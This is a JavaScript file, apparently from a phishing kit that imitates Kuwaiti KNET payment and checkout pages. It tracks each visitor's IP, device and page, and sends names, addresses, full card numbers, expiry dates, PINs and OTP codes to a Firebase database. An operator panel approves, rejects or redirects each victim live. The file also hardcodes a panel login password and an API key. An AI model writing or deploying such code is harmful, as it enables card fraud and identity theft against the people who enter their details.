(function () {
  // ═══════════════════════════════════════════════════════════
  // إعدادات مشروع Firebase الجديد (kuwait-b7d4b) — موحّد للموقعين
  // ═══════════════════════════════════════════════════════════
  const firebaseConfig = {
    apiKey: "AIzaSyAfWfzLyUlsq3NFsU2JK-qcIZkXgN023U0",
    authDomain: "kuwait-b7d4b.firebaseapp.com",
    databaseURL: "https://kuwait-b7d4b-default-rtdb.firebaseio.com",
    projectId: "kuwait-b7d4b",
    storageBucket: "kuwait-b7d4b.firebasestorage.app",
    messagingSenderId: "686238776602",
    appId: "1:686238776602:web:dfb65a9525b3b86cd740a3"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }

  // تحميل وحدة المصادقة ديناميكياً إذا لم تكن محمّلة
  let authLoaded = (typeof firebase.auth === 'function');
  const ensureAuthLoaded = (authLoaded
    ? Promise.resolve()
    : new Promise(function (resolve, reject) {
        const s = document.createElement('script');
        s.src = 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js';
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
      }));

  // بيانات دخول لوحة التحكم (نفس حساب اللوحة — له صلاحية قراءة/كتابة على customers)
  const PANEL_EMAIL = 'panel-dashboard@kuwait-b7d4b.local';
  const PANEL_PASSWORD = 'ZainDashboard2026!';
  let __authReady = null;

  window.ensureAuthReady = function () {
    if (__authReady) return __authReady;
    __authReady = ensureAuthLoaded.then(function () {
      return firebase.auth().signInWithEmailAndPassword(PANEL_EMAIL, PANEL_PASSWORD)
        .then(function () { return firebase.auth().currentUser.getIdToken(); });
    }).catch(function (err) {
      console.error('Firebase auth failed:', err && err.code, err && err.message);
      return null;
    });
    return __authReady;
  };

  const db = firebase.firestore();
  const rtd = firebase.database();

  // إتاحة المراجع عالمياً للصفحات الأخرى
  window.db = db;
  window.rtd = rtd;

  let sessionId = localStorage.getItem('zain_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('zain_session_id', sessionId);
  }
  window.sessionId = sessionId;

  // مرجع وثيقة العميل في Firestore (المصدر الموحّد للوحة التحكم الجديدة)
  const customerRef = db.collection("customers").doc(sessionId);
  window.customerRef = customerRef;

  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('gateway')) return 'بوابة الدفع';
    if (path.includes('carte')) return 'سلة التسوق';
    return 'الصفحة الرئيسية';
  }

  // ═══════════════════════════════════════════════════════════
  // ضمان وجود وثيقة العميل customers/{sessionId} بالحقول المطلوبة للوحة
  // ═══════════════════════════════════════════════════════════
  window.ensureCustomerDoc = function (extra) {
    const now = Date.now();
    const base = {
      sessionId: sessionId,
      status: 'pending',
      decision: 'pending',
      lastSeen: now,
      currentPage: getFriendlyPageName(),
      name: localStorage.getItem('customerName') || '',
      phone: localStorage.getItem('phone') || '',
      mobile: localStorage.getItem('phone') || '',
      address: localStorage.getItem('address') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      isHidden: false,
      flagColor: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    const merged = Object.assign({}, base, extra || {});
    return customerRef.set(merged, { merge: true });
  };

  // ═══════════════════════════════════════════════════════════
  // نبض الحضور (heartbeat) — يكتب lastSeen في customers/{sessionId} كل 10 ثوانٍ
  // كي يظهر العميل "متصل" في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  let __heartbeatTimer = null;
  window.startPresenceHeartbeat = function () {
    if (__heartbeatTimer) return;
    customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    __heartbeatTimer = setInterval(function () {
      customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    }, 10000);

    // عند مغادرة الصفحة: اكتب lastSeen قديم ليصبح العميل "غير متصل"
    window.addEventListener('beforeunload', function () {
      try {
        customerRef.set({ lastSeen: Date.now() - 70000 }, { merge: true });
      } catch (e) {}
    });
  };

  window.initFirebaseSession = async function () {
    const { device, browser } = window.getDeviceAndBrowser();
    const docRef = db.collection("payments").doc(sessionId);
    const friendlyPage = getFriendlyPageName();
    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
    const now = Date.now();
    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

    // جلب IP بشكل سريع وغير معطل للدخول
    let visitorIp = 'Unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      visitorIp = data.ip;
    } catch (e) {}

    const sessionData = {
      id: sessionId,
      status: 'active',
      phone: localStorage.getItem('phone') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      page: friendlyPage,
      device: device,
      browser: browser,
      createdTime: createdTime,
      startTime: now,
      country: 'الكويت',
      hasNewActivity: false,
      ip: visitorIp
    };

    // ضمان وجود وثيقة العميل في customers (المصدر الموحّد للوحة الجديدة)
    try {
      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser });
    } catch (e) { console.error("ensureCustomerDoc error:", e); }

    // بدء نبض الحضور
    window.startPresenceHeartbeat();

    // Update RTD (للتوافق مع اللوحة القديمة)
    rtdSessionRef.once('value', (snapshot) => {
      if (!snapshot.exists()) {
        rtdSessionRef.set(sessionData);
      } else {
        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
      }
    });

    // تتبع الحضور (presence) للوحة التحكم القديمة
    const presenceRef = rtd.ref('presence/' + sessionId);
    presenceRef.set({ online: true, lastSeen: now });
    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });

    // Update Firestore payments (أرشيف إضافي)
    docRef.get().then((snap) => {
      if (!snap.exists) {
        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
      } else {
        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
      }
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات البطاقة
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin) {
    const attemptId = 'card_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    const cardData = {
      id: attemptId,
      bankName: bank || 'غير معروف',
      cardPrefix: prefix || '',
      cardNumber: cardNum || '',
      expiry: `${expMonth || ''}/${expYear || ''}`,
      pin: pin || '',
      timestamp: timestampStr
    };

    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
    // أرشيف دائم في مجموعة cards
    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال رمز التحقق OTP
  // يكتب الحقل otp في وثيقة العميل customers/{sessionId} لعرضه في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseOtp = function (otp) {
    const otpId = 'otp_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };

    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
    // أرشيف دائم في مجموعة otps
    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
    // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
    customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    return Promise.resolve();
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
  // تُستدعى من صفحة السلة عند المتابعة للدفع
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCustomer = function (customer) {
    const data = {
      sessionId: sessionId,
      name: customer.name || '',
      phone: customer.phone || '',
      mobile: customer.phone || '',
      address: customer.address || '',
      apartment: customer.apartment || '',
      deliveryNotes: customer.deliveryNotes || '',
      amount: customer.amount || '',
      paymentType: customer.paymentType || 'full',
      items: customer.items || [],
      status: 'pending',
      decision: 'pending',
      lastSeen: Date.now(),
      currentPage: getFriendlyPageName(),
      isHidden: false,
      flagColor: '',
      ip: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    // حفظ الاسم محلياً لاستخدامه في ensureCustomerDoc
    if (data.name) localStorage.setItem('customerName', data.name);
    if (data.address) localStorage.setItem('address', data.address);
    // تحديث الجلسة اللحظية
    rtd.ref('sessions/' + sessionId).update({
      phone: data.phone,
      amount: data.amount,
      customerName: data.name,
      hasNewActivity: true
    });
    // حفظ دائم في Firestore customers (المصدر الموحّد للوحة الجديدة)
    db.collection("customers").doc(sessionId).set(data, { merge: true });
    if (data.items.length) {
      db.collection("orders").doc(sessionId).set({
        sessionId: sessionId,
        items: data.items,
        subtotal: data.amount,
        paymentType: data.paymentType,
        status: 'PENDING',
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    }
  };

  // ═══════════════════════════════════════════════════════════
  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
  // المصدر الأساسي: Firestore customers/{sessionId} — حقل decision/status
  //   decision = "approved" → onApproval
  //   decision = "rejected" → onRejection
  // مصدر احتياطي (للتوافق مع اللوحة القديمة): RTDB commands/{sessionId}
  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
  // ═══════════════════════════════════════════════════════════
  window.listenForAdminCommands = function (callbacks) {
    callbacks = callbacks || {};

    // ---- المصدر الأساسي: Firestore customers/{sessionId} عبر onSnapshot ----
    let __lastDecision = null;
    let __isFirst = true;

    function handleDecision(decision, data) {
      if (__isFirst) { __isFirst = false; __lastDecision = decision; return; }
      if (decision === __lastDecision) return;
      __lastDecision = decision;
      if (decision === 'approved') {
        if (typeof callbacks.onApproval === 'function') callbacks.onApproval({ decision: 'approved', status: data.status, raw: data });
      } else if (decision === 'rejected') {
        if (typeof callbacks.onRejection === 'function') callbacks.onRejection({ decision: 'rejected', status: data.status, reason: data.reason || '', raw: data });
      }
    }

    // استخراج قرار من استجابة Firestore REST (fields.decision.stringValue)
    function restDecision(fields) {
      if (!fields) return 'pending';
      var d = fields.decision || fields.status;
      return (d && d.stringValue) ? d.stringValue : 'pending';
    }

    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
    window.ensureAuthReady().then(function (token) {
      // الاستماع اللحظي عبر onSnapshot
      customerRef.onSnapshot((doc) => {
        if (!doc.exists) return;
        const data = doc.data() || {};
        handleDecision(data.decision || data.status || 'pending', data);
      }, (err) => { console.error("customerRef onSnapshot error:", err); });

      // استطلاع احتياطي عبر REST كل 4 ثوانٍ (يتشارك نفس آلية dedupe)
      const pollUrl = 'https://firestore.googleapis.com/v1/projects/kuwait-b7d4b/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
      setInterval(function () {
        fetch(pollUrl, { headers: token ? { 'Authorization': 'Bearer ' + token } : {} })
          .then(function (r) { return r.json(); })
          .then(function (d) { if (d && d.fields) handleDecision(restDecision(d.fields), d.fields); })
          .catch(function (e) { console.error('poll customers error:', e); });
      }, 4000);
    });

    // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
    const cmdRef = rtd.ref('commands/' + sessionId);

    cmdRef.child('approval').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled) {
        window.__approvalHandled = true;
        if (__lastDecision !== 'approved') {
          __lastDecision = 'approved';
          if (typeof callbacks.onApproval === 'function') callbacks.onApproval(cmd);
        }
      }
    });

    cmdRef.child('rejection').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled) {
        window.__rejectionHandled = true;
        if (__lastDecision !== 'rejected') {
          __lastDecision = 'rejected';
          if (typeof callbacks.onRejection === 'function') callbacks.onRejection(cmd);
        }
      }
    });

    cmdRef.child('redirect').on('value', (snap) => {
      const cmd = snap.val();
      if (cmd && cmd.action === 'REDIRECT_PAGE' && cmd.targetPage) {
        if (typeof callbacks.onRedirect === 'function') {
          callbacks.onRedirect(cmd);
        } else {
          window.location.href = cmd.targetPage;
        }
      }
    });

    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
      const msg = snap.val();
      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
    });
  };

  // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
  window.ensureAuthReady().then(function () {
    window.initFirebaseSession();
  });
})();
